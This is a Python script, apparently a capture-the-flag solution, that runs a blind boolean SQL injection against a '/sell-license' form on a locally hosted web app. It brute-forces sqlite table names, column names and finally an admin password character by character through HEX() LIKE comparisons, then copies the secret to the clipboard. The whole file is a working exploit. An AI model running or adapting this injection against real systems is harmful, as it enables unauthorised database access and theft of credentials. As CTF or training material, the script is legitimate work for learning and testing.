#!/usr/bin/env python3

import binascii
import string
import sys

import pyclip
import requests


def string_to_hex(input_string):
    """
    Convert a string to its hexadecimal representation
    the same way that sqlite3 HEX() function does.
    """
    encoded_bytes = input_string.encode("utf-8")

    # Convert the bytes to hexadecimal representation
    hex_representation = binascii.hexlify(encoded_bytes).decode("utf-8")

    return hex_representation.upper()


if len(sys.argv) < 3:
    print("Usage: python solution.py <license_key> <cookie> [<base_url>]")
    sys.exit(1)

cookies = {"session": sys.argv[2]}

# A session object to keep track of cookies
browser = requests.Session()

# The URL of the sell-license page
if len(sys.argv) > 3:
    base_url = sys.argv[3]
else:
    base_url = "http://0.0.0.0:5000"

"""
Exploit the SQL injection to get the flag from the database
"""
secret = ""
while True:
    found = False
    for character in string.printable:
        license_key = sys.argv[1]

        # Injection for table name
        injection = f"AND (SELECT 1 FROM sqlite_master WHERE type = 'table' AND HEX(tbl_name) LIKE '{string_to_hex(secret + character)}%' AND tbl_name NOT LIKE 'sqlite_%') AND '1'='1"

        # Injection for a table name different from licenses
        injection = f"AND (SELECT 1 FROM sqlite_master WHERE type = 'table' AND HEX(tbl_name) LIKE '{string_to_hex(secret + character)}%' AND tbl_name NOT LIKE 'license') AND '1'='1"

        # # Injection for columns names
        injection = f"AND (SELECT 1 FROM pragma_table_info('password') WHERE HEX(name) LIKE '{string_to_hex(secret + character)}%' AND name NOT LIKE 'license_key' AND name NOT LIKE 'id') AND '1'='1"

        # # Injection for admin password
        injection = f"AND (SELECT 1 FROM password WHERE key = '{license_key}' AND HEX(password) LIKE '{string_to_hex(secret + character)}%') AND '1'='1"

        data = {
            "license_key": f"{license_key}' {injection}",
        }

        # print(data['license_key'])

        response = browser.post(
            f"{base_url}/sell-license",
            cookies=cookies,
            data=data,
            allow_redirects=False,
        )

        # print(f'Trying: {secret + character}', end='\r')
        # print(response.text)
        # input('Continue?')

        while response.status_code == 302:
            response = browser.get(
                f"{base_url}{response.headers['Location']}",
                cookies=cookies,
                allow_redirects=False,
            )

        if "License sold successfully" in response.text:
            secret += character
            found = True
            break
        else:
            pass

    if not found:
        break

pyclip.copy(secret)
print(f"Secret: {secret}")
